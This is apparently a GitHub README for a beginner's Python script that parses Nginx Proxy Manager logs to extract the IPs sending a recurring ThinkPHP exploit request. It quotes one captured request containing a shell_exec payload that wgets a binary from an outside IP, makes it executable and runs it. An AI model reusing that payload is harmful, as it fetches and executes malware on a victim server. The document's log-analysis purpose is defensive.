# Update

I have found a way to filter out the IPs that send these requests and I've made a new script that does precisely that. To make it easier for anyone to run this script I've also implemented a simple menu for users to navigate trough with the ability to first parse the logs to find out any requests similar to the ones I've found and after that filter out all of this requests and it builds an list of indidual IPs that sent these requests.

It also creates all the directories it needs to work properly, and the only set up you need to do is the following:

1- A simple git clone command will copy everything you need to run this script, besides Python3 you have to set that up by yourself if your system does not come with python.

2- When you first run this script it asks for an **absolute path** to the default.log file, but **first make a copy of that file onto an other directory**. after that cd into that directory you just copied the file to and run the command `sudo chmod 777 default.log`, then you can run `pwd` and copy that output add an *default.log* to the end of it and give it as the absolute path for the default.log file.

3- **DO NOT TRY TO RUN THIS SCRIPT BEFORE DOING STEP 2!!** If you don't do that, the script will never stop running and you'll probably have to restart your machine and start over. I copied all the files from my NPM server to an usb drive and ran this script on my laptop just to be sure I don't get myself into an infinite loop!

4- You will probably have to run `chmod +x npm_log_parser.py` to make this script executable, so `cd` into the directory your git command created and then run the chmod command, after that you just need to type `./npm_log.parser.py` into the command line and the script will run. It will store a parsed version of the *default.log* file inside a directory called *parsed* and the results of the IP filter script inside a directory called *results*

As long as you keep the known issues in mind the script should always work, I started out with 374 lines of NPM logs, parsed them into 105 single lines, then was able to filter out a grand total of 81 unique public IPs making these requests!

This script should work in any linux distribution, however I only tested it in Pop Os 20.10, but from what I know the commands the script runs to create the folders on first start exist in all Unix based systems, *I think..*

**Known Issues**
If you chose option 1 in the main menu after parsing the default.log file the program will ask you if you want it to filter out the results right away, this almost works... If I run the script like this I get 78 unique public IPs, if I say `n` and grab the filename it gives me before quitting and restart the script and select option 2 and give it the name I just grabbed it will give me 81 unique IPs, which is my expected output.

# About this script

The idea behind this script comes from finding out a bunch of really strange requests to my Nginx Proxy Manager container that is open to the internet.
The requests in case are almost always identical to this:

`[13/Jan/2021:15:07:48 +0000] 400 - GET http localhost-nginx-proxy-manager "/index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.239.147.174/bins/MwEIrNsdFa.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp'" [Client 220.127.239.7] [Length 154] [Gzip -] "Uirusu/2.0" "-"`

The client IP is always different from what I can tell so far and the IP that it tries to wget is almost always different, trying to run that wget command will give you an "Not Authorized" response. **This script is not a solution for this issue** it just goes trough your NPM logs and finds out all the requests similar to this and puts them in a different file, I started out with a log file with 370 requests and, after running this script I got 108 requests that match the one I posted above, keep in mind that these 370 requests come from a timespan of less than 36h. And yes I am aware that NPM does not use PHP so this attempt to inject an PHP script most likely never runs ence the 400 (bad request) response from NPM, *however the authors of this could move from trying to inject PHP payloads to injecting something else that could work!*

This script reads trough your Nginx Proxy Manager logs, specially the **default.log** file stored inside your npm directory, right now you need an copy of the logs directory inside the root of this script's folder with the name of *logs*, you also need to create a directory called **parsed** so that the script can write a file with all of the requests that it looks for. It also asks for your Public IP in order to filter out your own requests to your npm server.

After running the script it will tell you how many results it got and it will also create a file that stores all of the requests it finds inside the **parsed** directory inside a file called **parsed-default.log**

Right now this scripts only does this, however I'm going to keep developing this script until it is able to extract a list of IPs from the *parsed-default.log*, besides doing this, the script will also be able to tell if the same IP tries to make this request more than once, the point of this is to see if these requests come from all over the world or just from countries known to have botnets like this running, like Iran, China and so on. So far I can say that this is not the case, because I've already found IPs from Italy and the UK that seem residential IPs but further investigation is required to reach an conclusion.

For anyone thinking that bulk blocking the IP ranges that this script find keep in mind that these IPs could also be comming from countries in the world that usually are known for not having these kinds of requests and you could possibly block people that you actually want to access your services without even knowing.

And finally a disclaimer, I am by no means a Python expert, just started to learn it less than a month ago, so it's probably going to take a while before I'm able to filter out the requests into a list of IP's. If you are willing to help me improve this script onto something that could help the NPM developers develop an fix for this feel free to contact me.
